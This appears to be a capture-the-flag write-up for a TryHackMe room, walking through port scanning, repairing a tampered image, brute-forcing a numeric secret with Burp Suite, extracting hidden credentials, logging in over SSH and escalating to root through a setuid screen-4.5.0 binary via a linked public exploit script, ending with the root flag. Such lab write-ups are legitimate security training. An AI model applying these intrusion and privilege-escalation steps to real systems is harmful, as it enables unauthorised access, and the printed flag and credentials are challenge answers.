Port scanning
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate=10000 10.10.213.198
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 21:23 EEST
Warning: 10.10.213.198 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.213.198
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV -A 10.10.213.198
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 21:25 EEST
Nmap scan report for 10.10.213.198
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   189.57 ms 10.6.0.1
2   ... 3
4   235.51 ms 10.10.213.198

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.78 seconds
```

So there is a website and ssh.

```bash
some interesting stuff i've found
        <img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
```
There is an image on the website but its like broken so we have to figure out whats wrong with it.

I opened it via hexeditor and can see that it says .png in the start so we have to change the hexadecimals to be of .jpg

It revelas and image of the hidden directory 
/th1s_1s_h1dd3n

The image itself also is hiding something behind a password.

There is a site that expects a number between 0-99 and we can automate this with burpsuite since i dont wanna do it manually.

I just let it run through the numbers and then just see if something seems out of ordinary.

The payload number 73 had a much higher lenght so I knew it had to be it.

```bash
HTTP/1.1 200 OK
Date: Fri, 15 Aug 2025 19:13:30 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 445
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>

</div>
</body>
</html>
```
For some reason the image on the tryhackme machine site had a image which was hiding stuff.
It had a password.txt inside of it. So I wonder what that previous text was if it wasnt the password§

```bash
cat password.txt                                  
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

And the password we got earlier reveals the username from the image
```bash
cat hidden.txt  
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```

That was very confusing but i managed to log in after encrypting multiple things and getting the real combo of username and password
joker:*axA&GF8dP

Now we can get the user.txt and now we can continue and try to get the root.txt

Linpeas didn't find anything interesting so i ran the
```bash
find /bin -perm -4000
```
Which showed me things that are ran as us root and can be used to gain priviledge

```bash
joker@ubuntu:/bin$ ls -la $(find /bin -perm -4000)
-rwsr-xr-x 1 root root   30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root   40152 Oct 10  2019 /bin/mount
-rwsr-xr-x 1 root root   44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root   44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0.old
-rwsr-xr-x 1 root root   40128 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root   27608 Oct 10  2019 /bin/umount
```

The screen-4.5.0 seemed interesting since its kinda out of place imo.

https://github.com/YasserREED/screen-v4.5.0-priv-escalate/blob/main/full-exploit.sh

Then we just run the script and then we gain a root shell

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
# cat root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```
